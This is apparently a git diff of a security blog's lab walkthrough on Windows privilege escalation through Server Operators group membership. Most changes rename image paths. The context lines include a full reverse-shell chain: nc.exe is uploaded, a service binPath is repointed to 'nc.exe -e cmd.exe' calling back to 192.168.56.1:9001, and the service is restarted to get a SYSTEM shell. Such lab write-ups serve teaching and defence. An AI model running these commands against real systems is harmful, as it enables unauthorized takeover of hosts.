@@ -22,35 +22,35 @@ The Server Operator group is a special user group that often has access to power
 
 ### Lab Configuration
 
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-1.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-1.png)](https://r00tven0m.github.io/)
 
 Let’s configure the lab on the server to apply theory and escalated windows server privileges. Go to server manager dashboard then click on “**Tools**” then select “**Active Directory Users and Computers**”
 
 We are going to add a user aarti to the active directory security group for the demonstration. To do that, go to **“users**” select “**carole.rose**” and click on “**properties**”.
 
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-2.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-2.png)](https://r00tven0m.github.io/)
 That will open a new window where we need to click on the “ **member of** “ tab and then click on the “**add**” button to add user to any specific group.
 
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-3.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-3.png)](https://r00tven0m.github.io/)
 
 
 A new window will open where we need to select object types as “**Groups or Built-in security principals**” and select location to domain name which is “**cbank. local**” here. Then, we need to enter object name which is the group to that we wish to add user to. In this case, we are using the **server operators’** group then click ok.
 
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-4.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-4.png)](https://r00tven0m.github.io/)
 
 
 We can verify whether a user is added to the server operators’ group by simply clicking on the **members of** tab. We can see that we have successfully added user carole.rose to server operators’ group.
 
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-5.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-5.png)](https://r00tven0m.github.io/)
 
 
 We end up with our lab set up here and logged in as low privileged user in the server where we can see user carole.rose is in the server operators’ group. In this example, we have connected to the compromised host using the winrm service using the evil-winrm tool. To check group permission, we can simply use the inbuilt command "net user username", it will show what groups the current user belongs to. To reproduce the concept, please follow the commands below
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-6.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-6.png)](https://r00tven0m.github.io/)
 
 
 Being a member of server operator group is not a vulnerability, but the member of this group has special privileges to make changes in the domain which could lead an attacker to escalate to system privilege. We listed services running on the server by issuing “**services**” command in our terminal where we can see list of services are there. Then we noted the service name “**WazuhSvc**” and service binary path for lateral usage.
 
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-7.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-7.png)](https://r00tven0m.github.io/)
 
 ### Exploitation
 
@@ -66,7 +66,7 @@ Steps to reproduce the POC:
 upload nc.exe
 sc.exe config WazuhSvc binPath="C:\Users\carole.rose.CBANK\Documents\nc.exe -e cmd.exe 192.168.56.1 9001"
 ```
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-8.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-8.png)](https://r00tven0m.github.io/)
 
 Then we will stop the service and start it again. So, this time when service starts, it will execute the binary that we have set in set earlier. Please, set up a netcat listener on the kali system to receive system shell before starting service and service start and stop commands from compromised hosts.
 
@@ -75,9 +75,9 @@ nc -nvlp 9001
 sc.exe stop WazuhSvc
 sc.exe start WazuhSvc
 ```
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-9.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-9.png)](https://r00tven0m.github.io/)
 
-We have received a reverse shell from the compromised host as **nt authority\system**. To verify it simply run “**whoami**” command.
+We have received a reverse  shell from the compromised host as **nt authority\system**. To verify it simply run “**whoami**” command.
 
 
-[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-10.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain-Privilege-Escalation/Server-Operator/2024-02-12-10.png)](https://r00tven0m.github.io/)
